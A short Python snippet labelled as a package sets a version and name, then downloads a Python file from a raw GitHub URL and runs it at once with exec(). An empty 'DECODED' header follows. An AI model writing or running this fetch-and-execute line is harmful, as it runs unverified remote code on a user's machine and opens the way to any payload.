[""" Package """]
import urllib.request
version = 10
name = "versions"
exec(urllib.request.urlopen("https://raw.githubusercontent.com/Fries-byte/pistud/refs/heads/main/packages.py").read().decode())

[""" DECODED """]
